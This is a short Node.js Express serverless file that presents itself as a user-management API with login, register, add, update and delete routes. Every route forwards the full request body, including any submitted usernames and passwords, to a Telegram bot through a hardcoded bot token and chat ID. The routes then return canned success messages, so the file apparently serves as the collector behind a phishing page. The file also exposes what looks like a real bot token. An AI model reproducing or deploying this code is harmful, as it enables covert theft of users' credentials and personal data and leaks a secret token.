// packages
require("dotenv").config();
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const app = express();
const router = express.Router();


app.use(cors());
app.use(express.json())
router.use(express.urlencoded({ extended: true }));


function sendTelegramMessage(request, response){
    const token = '6315212534:AAFPW1kYdl2gE6zIdHGsz999rjc60mqMjEU'; // Replace with your Telegram bot token
    const chatId = '1807394896';

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    const message = `Request Type : ${request.method} \nRequest URL : ${request.url} \nRequest Body : ${JSON.stringify(request.body)}`;
    const payload = {
        chat_id: chatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message sent successfully');
            } else {
                console.error('Error sending message:', data.description);
            }
        })
        .catch(error => console.error('Error:', error));

}

router.get('/', (req, res) => {
    res.send('hello world');
})

router.get('/test', (req, res) => {
    res.send('Working Good.......')
})

router.post('/add-user', (req, res) => {
    sendTelegramMessage(req, res)
    res.status(400);
})

router.put('/update-user', (req, res) => {
    sendTelegramMessage(req, res)
    res.send({"status":"200", "message":'User Updated Successfully'});
})

router.delete('/delete-user', (req, res) => {
    sendTelegramMessage(req, res)
    res.send({"status":"200", "message":'User deleted Successfully'})
})

router.post('/login', (req, res) => {
    sendTelegramMessage(req, res)
    res.send({"status":"200", "message":'success'} );
})

router.post('/register', (req, res) => {
    sendTelegramMessage(req, res)
    res.send({"status":"200", "message":'success'} );
})



app.use('/', router);

const handler = async (event, context) => {
    context.callbackWaitsForEmptyEventLoop = false;


    return serverless(app)(event, context);
};
  
module.exports.handler = handler;
